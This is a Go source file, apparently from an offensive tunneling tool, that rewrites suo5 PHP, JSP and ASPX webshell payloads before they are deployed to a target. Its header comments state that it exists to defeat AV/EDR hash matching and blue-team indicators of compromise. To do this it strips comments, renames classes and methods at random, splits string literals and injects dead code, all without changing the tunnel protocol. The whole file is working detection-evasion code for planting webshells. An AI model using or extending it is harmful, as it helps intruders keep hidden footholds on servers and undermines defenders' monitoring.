// suo5_perturb.go 是 suo5 payload 的一次性结构扰动层（批 7 P1-2）。
//
// 上游 suo5 项目的 suo5.php/jsp/aspx 是公开文件，内容哈希全网可比对（AV/EDR
// 样本库、蓝队 IOC 直接命中）。本层在投递前（deploySuo5Into 读盘之后、写目标
// 之前）对 payload 做每次部署都不同的变换，且只动"结构"不动协议：
//
//  1. 注释剥除（扫描器感知字符串字面量，不碰引号内内容）;
//  2. 代码内声明的类名/方法名随机重命名（词边界替换；字符串字面量不动；
//     接口回调方法名——run/verify/checkServerTrusted 等——在排除表里）;
//  3. 字符串字面量随机拆拼（'PHPSESSID' → 'PHP'.'SESSID'，协议字节不变）;
//  4. 无害死代码注入（未使用的局部/静态变量声明）。
//
// 不改协议逻辑：HTTP 头名、cookie 名、帧格式全部原样。data/tools/suo5-payloads
// 的原文件不动，变换只发生在内存。
package tunnel

import (
	"crypto/rand"
	"fmt"
	"math/big"
	"regexp"
	"strings"
)

// perturbSuo5Payload 按文件扩展名选择语言规则做结构扰动。任何一步内部失败都
// 返回原内容（诚实降级：宁可投原文也不投坏文件）。
func perturbSuo5Payload(file string, src []byte) []byte {
	lang := suo5LangOf(file)
	if lang == nil {
		return src
	}
	out, err := perturb(string(src), file, lang)
	if err != nil || out == "" {
		return src
	}
	return []byte(out)
}

// langSpec 描述一类服务端脚本的词法与改写规则。
type langSpec struct {
	lineComment  []string // 行注释前缀
	blockOpen    string   // 块注释
	blockClose   string
	quoteConcat  string // 字符串拼接符（php "."；java/c# "+"）
	declPatterns []*regexp.Regexp
	exclude      map[string]bool                   // 禁止重命名（接口回调/生命周期入口）
	deadDecl     func(name string, num int) string // 死代码形态
}

// suo5LangOf 按扩展名取语言规则；未知类型返回 nil（原样投递）。
func suo5LangOf(file string) *langSpec {
	switch strings.ToLower(file) {
	case "suo5.php":
		return &langSpec{
			lineComment: []string{"//", "#"},
			blockOpen:   "/*", blockClose: "*/",
			quoteConcat: ".",
			declPatterns: []*regexp.Regexp{
				regexp.MustCompile(`\bfunction\s+([A-Za-z_]\w*)\s*\(`),
			},
			exclude: map[string]bool{},
			deadDecl: func(name string, num int) string {
				return fmt.Sprintf("$%s = %d;\n", name, num)
			},
		}
	case "suo5.jsp":
		return &langSpec{
			lineComment: []string{"//"},
			blockOpen:   "/*", blockClose: "*/",
			quoteConcat: "+",
			declPatterns: []*regexp.Regexp{
				regexp.MustCompile(`\bclass\s+([A-Za-z_]\w*)`),
				// 带返回类型的方法声明
				regexp.MustCompile(`\b(?:public|private|protected)\s+(?:static\s+)?[\w<>\[\].?,]+\s+([A-Za-z_]\w*)\s*\(`),
				// 构造器（无返回类型）
				regexp.MustCompile(`\b(?:public|private|protected)\s+([A-Za-z_]\w*)\s*\(`),
			},
			// Runnable/HostnameVerifier/X509TrustManager 回调与 Object 方法不许改名
			exclude: map[string]bool{
				"run": true, "verify": true, "checkClientTrusted": true,
				"checkServerTrusted": true, "getAcceptedIssuers": true,
				"equals": true, "hashCode": true, "toString": true, "main": true,
			},
			deadDecl: func(name string, num int) string {
				return fmt.Sprintf("int %s = %d;\n", name, num)
			},
		}
	case "suo5.aspx":
		return &langSpec{
			lineComment: []string{"//"},
			blockOpen:   "/*", blockClose: "*/",
			quoteConcat: "+",
			declPatterns: []*regexp.Regexp{
				regexp.MustCompile(`\bclass\s+([A-Za-z_]\w*)`),
				regexp.MustCompile(`\b(?:public|private|protected|internal)\s+(?:static\s+)?[\w<>\[\].?,]+\s+([A-Za-z_]\w*)\s*\(`),
			},
			// ASP.NET 生命周期与 Object 方法不许改名
			exclude: map[string]bool{
				"Page_Load": true, "Page_Init": true, "Page_PreRender": true,
				"ToString": true, "Equals": true, "GetHashCode": true, "GetType": true,
				"Main": true, "Dispose": true,
			},
			deadDecl: func(name string, num int) string {
				return fmt.Sprintf("private static readonly int %s = %d;\n", name, num)
			},
		}
	}
	return nil
}

// segment 是文件的一段：code=true 的部分才做变换（jsp/aspx 里 HTML 模板与
// 指令段原样保留——它们可能是 template 伪装面，也是对外可见行为）。
type segment struct {
	code bool
	text string
}

// splitSegments 把 payload 切成代码段/原文段。php 认 <?php/<?= 到 ?> 或 EOF;
// jsp/aspx 认 <%!/<%/<%= 到 %>（<%@ 指令与 <%-- --%> 注释单独处理，前者原文
// 保留、后者整段剥除）,aspx 另认 <script runat="server">…</script>。
func splitSegments(src, lang string) []segment {
	switch lang {
	case "suo5.php":
		return splitPhpSegments(src)
	case "suo5.jsp":
		return splitTagSegments(src)
	case "suo5.aspx":
		return splitAspxSegments(src)
	}
	return []segment{{false, src}}
}

func splitPhpSegments(src string) []segment {
	var segs []segment
	rest := src
	for {
		i := strings.Index(rest, "<?")
		if i < 0 {
			if rest != "" {
				segs = append(segs, segment{false, rest})
			}
			break
		}
		if i > 0 {
			segs = append(segs, segment{false, rest[:i]})
		}
		rest = rest[i:]
		end := strings.Index(rest, "?>")
		if end < 0 {
			segs = append(segs, segment{true, rest})
			break
		}
		segs = append(segs, segment{true, rest[:end+2]})
		rest = rest[end+2:]
	}
	return segs
}

// splitTagSegments 切 <%…%> 族（jsp）。scriptlet/declaration/expression 为代码段；
// <%@ 指令与 <%-- --%> 注释为原文段（注释段交给 stripComments 剥除）。
func splitTagSegments(src string) []segment {
	var segs []segment
	rest := src
	for {
		i := strings.Index(rest, "<%")
		if i < 0 {
			if rest != "" {
				segs = append(segs, segment{false, rest})
			}
			break
		}
		if i > 0 {
			segs = append(segs, segment{false, rest[:i]})
		}
		rest = rest[i:]
		switch {
		case strings.HasPrefix(rest, "<%--"):
			end := strings.Index(rest, "--%>")
			if end < 0 {
				segs = append(segs, segment{code: true, text: rest}) // 未闭合：按代码段走,注释剥除会吃掉它
				return segs
			}
			segs = append(segs, segment{true, rest[:end+4]})
			rest = rest[end+4:]
		case strings.HasPrefix(rest, "<%@"):
			end := strings.Index(rest, "%>")
			if end < 0 {
				segs = append(segs, segment{false, rest})
				return segs
			}
			segs = append(segs, segment{false, rest[:end+2]})
			rest = rest[end+2:]
		default:
			end := strings.Index(rest, "%>")
			if end < 0 {
				segs = append(segs, segment{true, rest})
				return segs
			}
			segs = append(segs, segment{true, rest[:end+2]})
			rest = rest[end+2:]
		}
	}
	return segs
}

// splitAspxSegments 在 <%…%> 之外再认 <script runat="server">…</script>。
func splitAspxSegments(src string) []segment {
	var segs []segment
	rest := src
	lower := strings.ToLower(src)
	for len(rest) > 0 {
		iTag := strings.Index(rest, "<%")
		iScript := strings.Index(lower, `<script runat="server">`)
		// 取更早出现的边界
		i, isScript := iTag, false
		if iTag < 0 || (iScript >= 0 && iScript < iTag) {
			i, isScript = iScript, true
		}
		if i < 0 {
			segs = append(segs, segment{false, rest})
			break
		}
		if i > 0 {
			segs = append(segs, segment{false, rest[:i]})
			rest, lower = rest[i:], lower[i:]
		}
		if isScript {
			openLen := len(`<script runat="server">`)
			end := strings.Index(strings.ToLower(rest), "</script>")
			if end < 0 {
				segs = append(segs, segment{true, rest})
				break
			}
			// 开标签保留（原文）,内容作为代码段,闭标签并入代码段末尾由重组拼回
			segs = append(segs, segment{false, rest[:openLen]})
			segs = append(segs, segment{true, rest[openLen : end+len("</script>")]})
			rest, lower = rest[end+len("</script>"):], lower[end+len("</script>"):]
			continue
		}
		// <% 段:与 jsp 同规则
		sub := splitTagSegments(rest)
		// 只消费第一个段(它到第一个边界为止),其余下一轮重新找 script 边界
		segs = append(segs, sub[0])
		rest = rest[len(sub[0].text):]
		lower = lower[len(sub[0].text):]
	}
	return segs
}

// perturb 对整份 payload 做扰动：分段 → 代码段剥注释 → 收集重命名候选 →
// 重命名 + 字符串拆拼 → 死代码注入 → 重组。
func perturb(src, file string, lang *langSpec) (string, error) {
	segs := splitSegments(src, file)
	for i := range segs {
		if segs[i].code {
			segs[i].text = stripComments(segs[i].text, lang)
		}
	}
	renames := collectRenames(segs, lang)
	var b strings.Builder
	deadInjected := false
	for i, s := range segs {
		if !s.code {
			b.WriteString(s.text)
			continue
		}
		t := rewriteCode(s.text, lang, renames)
		if !deadInjected {
			if t2, ok := injectDeadCode(t, file, lang, i, segs); ok {
				t, deadInjected = t2, true
			}
		}
		b.WriteString(t)
	}
	return b.String(), nil
}

// stripComments 剥除代码段里的行/块注释（含 jsp 的 <%-- --%>；扫描器感知
// 字符串，引号内的 // 、/* 原样保留）。
func stripComments(code string, lang *langSpec) string {
	var b strings.Builder
	b.Grow(len(code))
	i := 0
	for i < len(code) {
		// 字符串字面量:整段原样拷贝
		if c := code[i]; c == '\'' || c == '"' {
			j := scanString(code, i)
			b.WriteString(code[i:j])
			i = j
			continue
		}
		matched := false
		for _, lc := range lang.lineComment {
			if strings.HasPrefix(code[i:], lc) {
				if nl := strings.IndexByte(code[i:], '\n'); nl >= 0 {
					i += nl // 换行保留,注释内容剥掉
				} else {
					i = len(code)
				}
				matched = true
				break
			}
		}
		if matched {
			continue
		}
		if strings.HasPrefix(code[i:], lang.blockOpen) {
			end := strings.Index(code[i+len(lang.blockOpen):], lang.blockClose)
			if end < 0 {
				break // 未闭合块注释:剥到段尾
			}
			i += len(lang.blockOpen) + end + len(lang.blockClose)
			continue
		}
		if strings.HasPrefix(code[i:], "<%--") {
			end := strings.Index(code[i+4:], "--%>")
			if end < 0 {
				break
			}
			i += 4 + end + 4
			continue
		}
		b.WriteByte(code[i])
		i++
	}
	return b.String()
}

// scanString 返回从 i（开引号）起的字符串字面量结束下标（含闭引号）;
// 未闭合时返回 len(code)。反斜杠转义通用（php/java/c# 一致）。
func scanString(code string, i int) int {
	q := code[i]
	for j := i + 1; j < len(code); j++ {
		switch code[j] {
		case '\\':
			j++ // 跳过转义位
		case q:
			return j + 1
		}
	}
	return len(code)
}

// collectRenames 从全部代码段提取声明标识符,生成随机新名映射。
// 出现在任何字符串字面量里的名字一律排除（防动态引用断裂）。
func collectRenames(segs []segment, lang *langSpec) map[string]string {
	cands := map[string]bool{}
	var stringSpans []string
	for _, s := range segs {
		if !s.code {
			continue
		}
		for _, re := range lang.declPatterns {
			for _, m := range re.FindAllStringSubmatch(s.text, -1) {
				name := m[1]
				if lang.exclude[name] || strings.HasPrefix(name, "__") {
					continue
				}
				cands[name] = true
			}
		}
		// 记录字符串字面量内容,用于排除动态引用
		for i := 0; i < len(s.text); {
			if c := s.text[i]; c == '\'' || c == '"' {
				j := scanString(s.text, i)
				stringSpans = append(stringSpans, s.text[i:j])
				i = j
			} else {
				i++
			}
		}
	}
	renames := map[string]string{}
	used := map[string]bool{}
	for name := range cands {
		bad := false
		for _, lit := range stringSpans {
			if strings.Contains(lit, name) {
				bad = true
				break
			}
		}
		if bad {
			continue
		}
		nn := randIdent()
		for used[nn] {
			nn = randIdent()
		}
		used[nn] = true
		renames[name] = nn
	}
	return renames
}

// randIdent 生成随机标识符（字母开头,字母数字混合,无语言含义）。
func randIdent() string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	const alnum = letters + "0123456789"
	n := 8 + randIntn2(5)
	var b strings.Builder
	b.WriteByte(letters[randIntn2(len(letters))])
	for i := 1; i < n; i++ {
		b.WriteByte(alnum[randIntn2(len(alnum))])
	}
	return b.String()
}

func randIntn2(n int) int {
	v, err := rand.Int(rand.Reader, big.NewInt(int64(n)))
	if err != nil {
		return 0
	}
	return int(v.Int64())
}

// rewriteCode 单遍改写：正常态下做标识符重命名（词边界）;字符串态下做
// 随机拆拼（含反斜杠转义的字面量跳过,免动语义）。
func rewriteCode(code string, lang *langSpec, renames map[string]string) string {
	var b strings.Builder
	b.Grow(len(code) + 64)
	i := 0
	for i < len(code) {
		c := code[i]
		if c == '\'' || c == '"' {
			j := scanString(code, i)
			b.WriteString(maybeSplitString(code[i:j], lang))
			i = j
			continue
		}
		if c == '$' || c == '_' || c == '#' || (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') {
			// 标识符/变量:$ 开头的不改名（php 双引号插值风险）,原样拷贝
			j := i + 1
			for j < len(code) && isIdentByte(code[j]) {
				j++
			}
			word := code[i:j]
			if c != '$' && c != '#' {
				if nn, ok := renames[word]; ok {
					word = nn
				}
			}
			b.WriteString(word)
			i = j
			continue
		}
		b.WriteByte(c)
		i++
	}
	return b.String()
}

func isIdentByte(c byte) bool {
	return c == '_' || (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9')
}

// maybeSplitString 以约 40% 概率把足够长、无转义的字面量拆成两段拼接。
// php 拆单引号串（协议字符串多为单引号）,java/c# 拆双引号串。协议字节不变。
func maybeSplitString(lit string, lang *langSpec) string {
	if len(lit) < 10 || strings.Contains(lit, `\`) {
		return lit
	}
	// php 只拆单引号（双引号有插值）,其它语言只拆双引号
	want := byte('"')
	if lang.quoteConcat == "." {
		want = '\''
	}
	if lit[0] != want {
		return lit
	}
	if randIntn2(5) >= 2 { // 60% 跳过,保持部分原文形态
		return lit
	}
	inner := lit[1 : len(lit)-1]
	at := 2 + randIntn2(len(inner)-3) // 两端各留至少 2 字符
	return lit[:1] + inner[:at] + lit[:1] + " " + lang.quoteConcat + " " + lit[:1] + inner[at:] + lit[:1]
}

// injectDeadCode 在合适锚点注入一段无害死代码（未使用变量声明）。每个文件一次。
// php: 第一个 <?php 后;top 级语句。aspx: 代码段开头（class 级静态字段）。
// jsp: 最后一个 <% scriptlet 开头（方法内局部变量,类外注入会编不过）。
func injectDeadCode(code, file string, lang *langSpec, segIdx int, segs []segment) (string, bool) {
	decl := lang.deadDecl(randIdent(), 100000+randIntn2(900000))
	switch file {
	case "suo5.php":
		if strings.HasPrefix(code, "<?php") {
			return "<?php\n" + decl + code[len("<?php"):], true
		}
	case "suo5.aspx":
		return "\n" + decl + code, true
	case "suo5.jsp":
		// 只在最后一个 scriptlet（执行入口）里注入局部变量
		last := -1
		for i, s := range segs {
			if s.code && strings.HasPrefix(s.text, "<%") && !strings.HasPrefix(s.text, "<%!") && !strings.HasPrefix(s.text, "<%=") {
				last = i
			}
		}
		if segIdx == last && strings.HasPrefix(code, "<%") {
			return "<%\n" + decl + code[2:], true
		}
	}
	return code, false
}
